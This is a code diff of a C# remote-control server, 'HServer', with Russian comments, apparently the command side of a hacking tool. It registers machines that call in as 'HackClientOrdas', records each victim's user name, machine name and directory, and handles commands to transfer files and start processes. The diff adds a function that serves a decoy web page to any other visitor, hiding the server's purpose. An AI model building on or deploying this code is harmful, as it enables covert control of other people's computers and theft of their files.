@@ -23,12 +23,6 @@ namespace HServer
         static BinaryWriter writer = new BinaryWriter(ms);//запись в поток
         static Thread server = new Thread(threadServer);
 
-        static Dictionary<string, int> code = new Dictionary<string, int>()//команда и код
-        {
-            {"cc", 1},
-            {"upload", 2},            
-        };
-
 
         static void Main(string[] args)
         {
@@ -48,27 +42,36 @@ namespace HServer
         {
                 
             Client client = new Client(socket.EndAccept(ar));//получение сокета клиента            
-            Thread thread = new Thread(HandleClient);//создаем поток для каждого клиента
-            thread.Start(client);//запускаем общение с клиентом при подключении
-            clients.Add(client);//добавляем клиента в список
-            //Console.WriteLine("Новое подключение.");
+            Thread thread = new Thread(HandleClient);//создаем поток для каждого клиента 
+            
+            thread.Start(client);//запускаем общение с клиентом при подключении       
             socket.BeginAccept(AcceptCallBack, null);
         }
 
         private static void HandleClient(object o)
         {
-            Client client = (Client)o;//наш клиен             
-            BinaryReader reader = new BinaryReader(ms);//чтение из потока
+            Client client = (Client)o;//наш клиен   
+            using (MemoryStream msIntroduce = new MemoryStream(new byte[256*100], 0, 256*100, true, true))
+            {               
+                BinaryReader readerIntroduce = new BinaryReader(msIntroduce);//чтение из потока
+                BinaryWriter writerIntroduce = new BinaryWriter(msIntroduce);
+                msIntroduce.Position = 0;
+                client.Socket.Receive(msIntroduce.GetBuffer());
+                client.identifier = readerIntroduce.ReadString();
+                client.userName = readerIntroduce.ReadString();
+                client.machineName = readerIntroduce.ReadString();
+                client.currentDirectory = directory = readerIntroduce.ReadString();               
+            }
+                
             
-
-            #region intoduce
-            ms.Position = 0;            
-            client.Socket.Receive(ms.GetBuffer());
-            client.userName = reader.ReadString();
-            client.machineName = reader.ReadString();
-            client.currentDirectory = directory = reader.ReadString();
-            #endregion
-            
+            if (client.identifier.Equals("HackClientOrdas"))//если это наш клиент мы его добавляем
+            {
+                clients.Add(client);//добавляем клиента в список  
+            }
+            else
+            {
+                HttpAswer(client); //клиент не наш
+            }
         }
 
         private static void threadServer()//поток сервера
@@ -157,7 +160,7 @@ namespace HServer
                         LoadFile(client);
                         break;
                     case 6: //скачивание файла с машины клиента
-                        Test(client);
+                        StartProcess(client);
                         break;
                     case 100: //проверка вкрсии клиента
                         CheckAnswer(client, ms);
@@ -172,19 +175,8 @@ namespace HServer
             }
         }
 
-        private static void Test(Client client)//функция для тестирования
-        {
-            ms.Position = 0;
-            writer.Write("TEST OK");
-            client.Socket.Send(ms.GetBuffer());
-            ms.Position = 0;
-            client.Socket.Receive(ms.GetBuffer());
-            Console.WriteLine(reader.ReadString());
-            ms.Position = 0;
-            writer.Write("GOT IT");
-            client.Socket.Send(ms.GetBuffer());
-            ms.Position = 0;
-            client.Socket.Receive(ms.GetBuffer());
+        private static void StartProcess(Client client)//функция для тестирования
+        {           
             Console.WriteLine(reader.ReadString());
         }
 
@@ -231,40 +223,7 @@ namespace HServer
             Console.WriteLine("otvet -> " + answ);
             Console.WriteLine(answ);
         }
-        /* private static void LoadFile(Client client)//загрузка файла
-         {
-             ms.Position = 0;
-             client.Socket.Receive(ms.GetBuffer());
-             int length = reader.ReadInt32();           
-             if (length == -1)
-             {
-                 Console.WriteLine("Не верное имя файла.");
-                 return;
-             }
-             byte[] data = new byte[length];
-             string name = reader.ReadString();
-             //ms.Position = 0;
-             //writer.Write("ok");
-             //client.Socket.Send(ms.GetBuffer());
-             Console.WriteLine("Загрузка начата.");//код операции            
-             string path = Environment.CurrentDirectory + "\\download\\" + client.userName + "_" + name;
-             using (FileStream fs = new FileStream(path, FileMode.OpenOrCreate))
-             {
-                 using (MemoryStream msFile = new MemoryStream(new byte[length], 0, length, true, true))
-                 {
-                     BinaryReader readerFile = new BinaryReader(msFile);
-                     msFile.Position = 0;
-                     client.Socket.Receive(msFile.GetBuffer());                  
-                     data = readerFile.ReadBytes(length);
-                     fs.Write(data, 0, data.Length);                                                        
-                     Thread.Sleep(5000);
-                 }
-                 ms.Position = 0;
-                 client.Socket.Receive(ms.GetBuffer());               
-                 //string answ = reader.ReadString();
-                 Console.WriteLine("Done");
-             }
-         }*/
+       
 
         private static void CheckAnswer(Client client, MemoryStream ms)//проверка версии
         {            
@@ -367,7 +326,7 @@ namespace HServer
             client.currentDirectory = directory = reader.ReadString();
         }
 
-        private static void ErroreCode(MemoryStream ms)
+        private static void ErroreCode(MemoryStream ms)//код ошибки
         {
             BinaryReader reader = new BinaryReader(ms);//чтение из поток
             Console.WriteLine(reader.ReadString());
@@ -381,7 +340,7 @@ namespace HServer
             
         }
 
-        private static void GetDirectory(Client client,MemoryStream ms)
+        private static void GetDirectory(Client client,MemoryStream ms) //получаем директории
         {
             
             BinaryReader reader = new BinaryReader(ms);//чтение из потока           
@@ -395,20 +354,40 @@ namespace HServer
             }           
         }
 
+        private static void HttpAswer(Client client) //если не является клиентом посылаем страницу
+        {
+            string htmlData;
+            using (FileStream fs = new FileStream(AppDomain.CurrentDomain.BaseDirectory+"\\site\\index.html", FileMode.Open))
+            {
+                byte[] data = new byte[fs.Length];
+                fs.Read(data, 0, data.Length);
+                htmlData = System.Text.Encoding.UTF8.GetString(data).TrimEnd('\0');
+            }
+            //Console.WriteLine(client.identifier +client.currentDirectory +client.machineName + client.userName +" \n\t" );
+            string Str = "HTTP/1.1 200 OK\nContent-type: text/html\nContent-Length:" + htmlData.Length.ToString() + "\n\n" + htmlData;
+
+            byte[] buffer = System.Text.Encoding.UTF8.GetBytes(Str);
+            writer.Write(buffer);
+            client.Socket.Send(buffer);
+            
+
+        }
+
         private static void CheckClients(ref Client currentClient)//функция проверки подключен ли клиент
         {
             for (int i = 0; i < clients.Count; i++)//проходит по списку клиентов и опрашивет их
             {
-                if (clients[i].Socket.Poll(1, SelectMode.SelectRead) && socket.Available == 0) //если он отключился
+                if ((clients[i].Socket.Poll(1, SelectMode.SelectRead) && socket.Available == 0)) //если он отключился
                 {
                     
                     if (currentClient.Equals(clients[i]))  // проверяем не является ли он текущим клиентом
                     {
                         currentClient = new Client();//если да обнуляем его
+                        Console.Clear();
                         Console.WriteLine("Клиент отключился");
                     }
                     clients.Remove(clients[i]);//удалям клиента из списка
-                }           
+                }                      
             }
         }
         
@@ -418,6 +397,7 @@ namespace HServer
     class Client
     {
         public Socket Socket { get; set; }
+        public string identifier { get; set; }
         public string userName { get; set; }
         public string machineName { get; set; }
         public string currentDirectory { get; set; }
@@ -431,6 +411,7 @@ namespace HServer
         public Client()
         {
             isEmpity = true;
+            identifier = "null";
             userName = "null";
             machineName = "null";
             currentDirectory = "null";
